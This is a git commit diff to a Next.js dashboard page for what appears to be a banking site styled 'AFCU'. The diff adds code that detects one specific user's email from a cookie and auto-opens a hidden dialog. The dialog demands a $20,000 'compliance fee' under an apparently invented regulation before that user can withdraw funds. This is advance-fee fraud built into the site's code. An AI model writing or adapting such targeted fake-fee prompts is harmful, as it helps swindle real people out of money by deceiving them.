908a17c36cdf64a64dd5736cae88a11440d30cef
Franklin Ebi <esendufranklinebi@gmail.com>
2025-03-20 01:16:10 +0100

    added restriction on page

--- app/dashboard/page.tsx
+++ app/dashboard/page.tsx
@@ -1,12 +1,22 @@
 'use client'
-
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+  AlertDialogTrigger,
+} from "@/components/ui/alert-dialog"
 import { TfiReceipt } from "react-icons/tfi"
 import { usePathname } from 'next/navigation'
 import { FaRegArrowAltCircleUp } from "react-icons/fa";
 import { IoIosArrowDropdown } from "react-icons/io";
 import { useEffect,useState } from "react";
 import Cookies from "js-cookie";
-
+import { useRef } from "react";
 import { signOut } from "firebase/auth";
 import {auth} from "../mycomps/firebase";
 import Dashboardnavcomp from "../mycomps/Dashboardnavcomp";
@@ -25,6 +35,7 @@ import { useRouter } from "next/navigation";
 import useUser from "../mycomps/hooks/useUser";
 import useOpen from "../mycomps/hooks/useOpen";
 import Dashboarddesktop from "../mycomps/Dashboarddesktop";
+import { Button } from "@/components/ui/button";
 
 
 
@@ -33,24 +44,68 @@ export default function Dashboard(){
   const {isOpen,setIsOpen} =useOpen()
   const pathname = usePathname()
   const router = useRouter() 
+  const buttonRef = useRef<HTMLButtonElement>(null)
+ //programmatically click 
+ const clickref = () =>{
  
+
+    if(buttonRef.current){
+      buttonRef.current.click()
+  
+    }
+  
+
+ }
   useEffect(()=>{
     console.log(pathname,typeof(pathname))
     const userCookie = Cookies.get('User')
     if(userCookie){
-      setUser(JSON.parse(userCookie))
-      console.log(user)
+      const parsedCookie = JSON.parse(userCookie)
+      if(parsedCookie.email === 'kevincostnerx5@gmail.com'){
+        clickref()
+      }
+      setUser(parsedCookie)
+      
+      
     }
     else{
       router.push('/login')
     }
+   
 
+    
   },[pathname])
 
   return<>
 <div className="md:flex">
 <Dashboarddesktop />
 
+
+{/* //for kevin costner  */}
+<AlertDialog>
+      <AlertDialogTrigger asChild>
+        <Button className="hidden" ref={buttonRef} variant="outline">Show Dialog</Button>
+      </AlertDialogTrigger>
+      <AlertDialogContent>
+        <AlertDialogHeader>
+          <AlertDialogTitle>  Important Notice
+          </AlertDialogTitle>
+          <AlertDialogDescription>
+Dear {user.firstname} to proceed with your withdrawal request, please note that under our updated High-Value Transaction Security Rule (Regulation HVTS-2025), a one-time compliance fee of $20,000 is required for withdrawals exceeding your limit. This measure ensures enhanced security and fraud prevention for large transactions. . For more details contact support.
+Thank you for your cooperation.
+AFCU Team  
+
+
+          </AlertDialogDescription>
+        </AlertDialogHeader>
+        <AlertDialogFooter>
+          
+          <AlertDialogAction>Continue</AlertDialogAction>
+        </AlertDialogFooter>
+      </AlertDialogContent>
+    </AlertDialog>
+
+    {/* //end */}
 
   
 <div className="md:w-4/5 ">
